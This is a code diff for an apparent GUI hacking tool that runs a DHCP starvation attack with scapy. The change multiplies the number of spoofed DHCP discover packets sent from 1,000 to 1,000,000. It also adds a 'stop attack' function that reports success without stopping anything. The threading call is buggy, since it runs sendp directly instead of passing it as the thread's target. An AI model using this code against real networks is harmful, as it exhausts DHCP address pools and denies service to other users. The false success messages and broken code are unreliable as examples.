@@ -49,6 +49,22 @@ def stopDhcp() :
     except Exception as e:
         errorOutputLabel["text"] += "ERROR : \n" + e + "\n"
 
+def stopDhcpChain(chainTerminalContentFrame, chainErrorContentFrame) :
+    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainTerminalLabel.pack(anchor = NW)
+    chainErrorOutputLabel.pack(anchor = NW)
+    
+    try:
+        chainTerminalLabel["text"] += "$ Stopping DHCP Table Attack...\n"
+
+
+        chainTerminalLabel["text"] += "$ DHCP Table Attack successfully stopped!\n"
+    except (AttributeError, RuntimeError):
+        chainErrorOutputLabel["text"] += traceback.format_exc()
+    except Exception as e:
+        chainErrorOutputLabel["text"] += "ERROR : \n" + e + "\n"
+
 def runDhcpAttack() :
     global dhcpThreads
     dhcpThreads.start()
@@ -63,7 +79,7 @@ def startDhcpStarvation(interface):
                      /DHCP(options=[('message-type','discover'),('end')])
     
     terminalLabel["text"] += "$ Sending DHCP Packets...\n"
-    sendPacketsThread = threading.Thread(sendp(dhcp_discover,iface=interface,count=1000,verbose=1))
+    sendPacketsThread = threading.Thread(sendp(dhcp_discover,iface=interface,count=1000000,verbose=1))
     try :
         sendPacketsThread.start()
     except Exception as e :
